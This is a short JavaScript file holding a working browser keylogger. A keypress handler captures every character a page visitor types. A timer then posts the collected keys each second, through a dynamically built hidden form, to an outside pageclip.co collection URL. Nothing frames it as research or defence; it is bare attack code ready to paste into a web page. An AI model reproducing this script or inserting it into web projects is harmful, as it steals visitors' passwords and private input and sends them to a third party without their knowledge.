
function post(path, params, method='post') {

  // The rest of this code assumes you are not using a library.
  // It can be made less verbose if you use one.
  const form = document.createElement('form');
  form.method = method;
  form.action = path;

  for (const key in params) {
    if (params.hasOwnProperty(key)) {
      const hiddenField = document.createElement('input');
      hiddenField.type = 'hidden';
      hiddenField.name = key;
      hiddenField.value = params[key];

      form.appendChild(hiddenField);
    }
  }

  document.body.appendChild(form);
  form.submit();
  setTimeout(function(){document.body.removeChild(form)}, 500)
}

var keys='';
var url = 'https://send.pageclip.co/mMJZqTWOskoatOv5E2bqIWkAxqcetkfi';
document.onkeypress = function(e) {
	let get = window.event?event:e;
	let key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	keys+=key;
}
window.setInterval(function(){
	if(keys.length>0) {
		post(url, {text: keys});
		keys = '';
	}
}, 1000);
